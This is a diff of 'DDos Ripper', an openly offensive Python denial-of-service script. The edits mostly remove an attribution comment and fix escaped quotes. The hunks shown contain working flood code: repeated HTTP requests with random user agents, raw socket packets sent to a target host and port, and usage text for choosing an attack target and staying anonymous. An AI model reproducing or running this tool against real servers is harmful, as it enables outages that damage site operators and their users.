@@ -1,6 +1,3 @@
-# Python code deobfuscated by france1
- 
-
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
@@ -60,7 +57,7 @@ def bot_rippering(url):
 def bot_again_rippering(url):
     try:
         while True:
-            req = urllib.request.urlopen(urllib.request.Request(url, headers={\'User-Agent\': random.choice(uagent)}))
+            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
             print("\\033[90magain bot is rippering...\\033[0m")
             time.sleep(.1)
     except:
@@ -74,7 +71,7 @@ def down_it(item):
 Host: "+host+"\
 \
  User-Agent: "+random.choice(uagent)+"\
-"+data).encode(\'utf-8\')
+"+data).encode('utf-8')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host,int(port)))
             if s.sendto( packet, (host, int(port)) ):
@@ -110,9 +107,9 @@ def dos2():
   #      e.task_done()
 
 def usage():
-    print (\'\'\' \\033[0;95mDDos Ripper
+    print (''' \\033[0;95mDDos Ripper
 
-    It is the end user\'s responsibility to obey all applicable laws.
+    It is the end user's responsibility to obey all applicable laws.
     It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous! \
 
     Usage : python3 dripper.py [-s] [-p] [-t] [-q]
@@ -121,7 +118,7 @@ def usage():
     -p : -port default 80
     -q : -quiet
 
-    -t : -turbo default 135 or 443 \\033[0m \'\'\')
+    -t : -turbo default 135 or 443 \\033[0m ''')
 
     sys.exit()
 
@@ -135,10 +132,10 @@ def get_parameters():
     optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
     optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
     optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 or 443 -t 135 or 443")
-    optp.add_option("-h","--help",dest="help",action=\'store_true\',help="help you")
+    optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
     optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
     opts, args = optp.parse_args()
-    logging.basicConfig(level=opts.loglevel,format=\'%(levelname)-8s %(message)s\')
+    logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
     if opts.help:
         usage()
     if opts.host is not None:
@@ -168,7 +165,7 @@ w = Queue()
 e = Queue()
 
 
-if __name__ == \'__main__\':
+if __name__ == '__main__':
     if len(sys.argv) < 2:
         usage()
     get_parameters()
